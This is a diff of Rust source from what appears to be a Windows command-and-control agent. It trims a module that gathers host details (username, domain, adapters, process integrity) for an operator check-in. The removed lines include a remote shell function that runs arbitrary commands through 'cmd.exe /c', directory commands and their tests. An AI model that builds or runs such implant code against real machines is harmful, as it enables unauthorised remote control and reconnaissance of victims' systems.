@@ -1,27 +1,20 @@
 use core::ffi::c_void;
+
 use libc_print::libc_println;
 use mod_agentcore::{instance, instance_mut};
 use mod_win32::{
     nt_current_process,
     nt_get_adapters_info::get_adapters_info,
     nt_get_computer_name_ex::{get_computer_name_ex, ComputerNameFormat},
-    nt_path::change_directory,
     nt_peb::{
-        get_current_directory, get_image_path_name, get_os, get_os_version_info, get_process_name,
-        get_user_domain, get_username,
+        get_image_path_name, get_os, get_os_version_info, get_process_name, get_user_domain,
+        get_username,
     },
-    nt_ps_api::{get_pid_and_ppid, get_process_integrity, nt_create_process_w_piped},
-    nt_time::delay,
+    nt_ps_api::{get_pid_and_ppid, get_process_integrity},
 };
-use rs2_communication_protocol::{
-    communication_structs::{
-        checkin::{Checkin, PartialCheckin},
-        task_output::TaskOutput,
-    },
-    metadata::Metadata,
-};
+use rs2_communication_protocol::communication_structs::checkin::{Checkin, PartialCheckin};
 
-use crate::{common::AgentErrors, init::checkin_from_raw};
+use crate::setup::system_data::checkin_from_raw;
 
 /// Terminates the current process based on the provided exit type.
 ///
@@ -153,124 +146,9 @@ pub fn command_checkin() -> Result<String, serde_json::Error> {
     serde_json::to_string(unsafe { checkin_from_raw(instance().pcheckindata.as_mut().unwrap()) })
 }
 
-/// Changes the current working directory to the specified path.
-///
-/// This function attempts to change the directory using an internal mechanism that
-/// utilizes the `NtOpenFile` NT API. If the operation is successful, it returns the new
-/// current directory as a `String`. In case of an error, it returns a corresponding `Error`.
-///
-/// # Nt API involved
-/// - `NtOpenFile`: Used internally to open the specified directory.
-///
-/// # Parameters
-/// - `path`: A string slice representing the directory path to change to.
-///
-/// # Returns
-/// - `Result<String, AgentErrors>`: On success, returns the new current directory as a `String`.
-///   On failure, returns an `AgentErrors::ChangeDirectoryFailed` error.
-pub fn command_cd(path: &str) -> Result<String, AgentErrors> {
-    // Attempt to change the directory
-    if change_directory(path) < 0 {
-        // If the change_directory function returns a negative value, an error occurred
-        return Err(AgentErrors::ChangeDirectoryFailed);
-    }
-
-    // If successful, retrieve the new current directory and return it
-    let current_dir = get_current_directory();
-    Ok(current_dir)
-}
-
-/// Retrieves the current working directory.
-///
-/// This function retrieves the current directory by accessing the `Process Environment Block (PEB)`.
-/// If the directory cannot be retrieved, it returns an `Error`.
-///
-/// # Details
-/// - The function reads the current directory path directly from the PEB, which stores
-///   environment information for the running process.
-///
-/// # Returns
-/// - `Result<String, AgentErrors>`: On success, returns the current directory as a `String`.
-///   On failure, returns an `AgentErrors::PrintWorkingDirectoryFailed` error.
-pub fn command_pwd() -> Result<String, AgentErrors> {
-    // Retrieve the current working directory from the PEB
-    let current_dir = get_current_directory();
-
-    // Check if the current directory was successfully retrieved
-    if current_dir.is_empty() {
-        // If the directory is empty, an error occurred during retrieval
-        return Err(AgentErrors::PrintWorkingDirectoryFailed);
-    }
-
-    // If successful, return the current directory
-    Ok(current_dir)
-}
-
-/// Executes a command in a new process using `cmd.exe`.
-///
-/// This function spawns a new process using `nt_create_process_w_piped` and executes the
-/// specified command via `cmd.exe /c`. The output of the command is captured and returned
-/// as a `String`. If the output is empty, an error is returned.
-///
-/// # Parameters
-/// - `cmdline`: A string slice representing the command to be executed.
-///
-/// # Returns
-/// - `Result<String, AgentErrors>`: On success, returns the output of the command as a `String`.
-///   On failure, returns an `AgentErrors::CmdOutputIsEmpty` error if no output is captured.
-///
-/// # Errors
-/// - Returns `AgentErrors::CmdOutputIsEmpty` if the command returns an empty output.
-///
-/// # Safety
-/// - This function is marked `unsafe` because it interacts with the NT API through
-///   `nt_create_process_w_piped`, which involves low-level process creation.
-pub fn command_shell(cmdline: &str) -> Result<String, AgentErrors> {
-    let target_process = "C:\\Windows\\System32\\cmd.exe"; // Target path for cmd.exe
-    let cmd_prefix = "cmd.exe /c "; // Prefix to execute the command
-
-    // Use `nt_create_process_w_piped` to create a new process and execute the command.
-    // This returns a `Vec<u8>` containing the output.
-    let output = unsafe {
-        nt_create_process_w_piped(
-            &target_process,                               // Path to cmd.exe
-            format!("{}{}", cmd_prefix, cmdline).as_str(), // Full command to execute
-        )
-    };
-
-    // Check if the output is empty
-    if output.is_empty() {
-        return Err(AgentErrors::CmdOutputIsEmpty); // Return an error if no output is captured
-    }
-
-    // Convert the output (a byte vector) to a String, ensuring proper UTF-8 formatting
-    let output_str = String::from_utf8_lossy(&output);
-
-    // Return the output string (it's not a Cow<_, str>, it is converted to String here)
-    Ok(output_str.into_owned()) // `into_owned` converts the Cow to a full String
-}
-
-// #[cfg(feature = "std-runtime")]
-// Simulated task that takes 2 seconds to complete.
-pub fn task_type_a(metadata: Metadata) -> TaskOutput {
-    delay(1);
-    let mut output = TaskOutput::new();
-    output.with_metadata(metadata);
-    output.output = Some("Result from task type A".to_string());
-    output
-}
-
-// #[cfg(feature = "std-runtime")]
-// Simulated task that takes 3 seconds to complete.
-pub fn task_type_b(metadata: Metadata) -> TaskOutput {
-    delay(12);
-    let mut output = TaskOutput::new();
-    output.with_metadata(metadata);
-    output.output = Some("Result from task type B".to_string());
-    output
-}
-
+#[cfg(test)]
 mod tests {
+
     use super::*;
 
     #[test]
@@ -307,68 +185,5 @@ mod tests {
         );
 
         // You can extend these checks with specific values or fields
-    }
-
-    #[test]
-    fn test_cd() {
-        // Test changing to a valid directory
-        let target_directory = "C:\\Windows\\System32\\drivers\\etc";
-        let result = command_cd(target_directory);
-        assert!(
-            result.is_ok(),
-            "Failed to change to directory: {}",
-            target_directory
-        );
-        let result_dir = result.unwrap();
-        assert!(
-            result_dir.ends_with("C:\\Windows\\System32\\drivers\\etc"),
-            "Expected directory: C:\\Windows\\System32\\drivers\\etc, but got: {}",
-            result_dir
-        );
-
-        // Test changing to the parent directory with "cd .."
-        let result = command_cd("..\\..");
-        assert!(result.is_ok(), "Failed to change to parent directory");
-        let result_dir = result.unwrap();
-        assert!(
-            result_dir.ends_with("C:\\Windows\\System32"),
-            "Expected directory: C:\\Windows, but got: {}",
-            result_dir
-        );
-    }
-
-    #[test]
-    fn test_pwd() {
-        let cwd = command_pwd();
-        assert!(
-            cwd.is_ok(),
-            "Expected cwd to be Ok, but got an error: {:?}",
-            cwd
-        );
-
-        // Optionally, you can unwrap after confirming it's Ok
-        let cwd_str = cwd.unwrap();
-        assert!(
-            !cwd_str.is_empty(),
-            "Expected a non-empty current directory"
-        );
-    }
-
-    #[test]
-    fn test_shell() {
-        // Test executing a simple command
-        let cmd = "set";
-        let result = command_shell(cmd);
-
-        // Ensure the result is successful
-        assert!(
-            result.is_ok(),
-            "Failed to execute command: {:?}",
-            result.err()
-        );
-
-        // Print the output for visibility
-        let output = result.unwrap();
-        libc_println!("Command Output: {}", output);
     }
 }
